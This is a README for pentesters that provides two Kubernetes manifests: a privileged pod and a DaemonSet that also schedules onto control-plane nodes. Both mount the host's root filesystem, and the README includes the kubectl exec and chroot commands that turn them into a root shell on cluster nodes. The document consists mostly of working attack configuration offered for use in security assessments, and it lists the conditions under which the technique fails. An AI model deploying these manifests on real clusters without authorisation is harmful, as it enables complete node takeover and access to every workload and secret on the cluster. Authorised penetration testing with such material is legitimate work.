# Attacker Manifests

These are Kubernetes manifests that could be useful on security assessments, or pentests. 

N.B. for pentesters, make sure you have delete rights to the objects you create and make sure to clean up when you're done!

## General form

* `kubectl create -f [MANIFEST.YAML]` creates object contained in a file called [MANIFEST.YAML]
* `kubectl delete -f [MANIFEST.YAML]` deletes object contained in a file called [MANIFEST.YAML]

if you want to create the objects in a specific namespace that isn't your current active one add the following to your manifest under metadata

```yaml
  namespace: [NAMESPACENAME]
```

## Root Pod

This manifest will create a privileged pod on a node in the cluster. Once it's running `kubectl exec -it noderootpod chroot /host` should give you a root shell on the node.

This won't work if :-

1. You don't have right to create pods in the namespace
2. The node can't pull images from Docker Hub
3. There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

## Root daemonset

This manifest does the same thing as the pod one, except it creates a pod on every cluster node (including control plane nodes in un-managed clusters). Once it's running, get a list of pods in the daemonset with `kubectl get daemonset noderootdaemon` then use kubectl exec (as above) to execute the `chroot /host` command in one of the pods

This won't work if :-

1. You don't have right to create daemonsets in the namespace
2. The node can't pull images from Docker Hub
3. There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods by the replicaset controller in that namespace.


```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootdaemon
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      volumes:
      - name: noderoot
        hostPath:
          path: /
```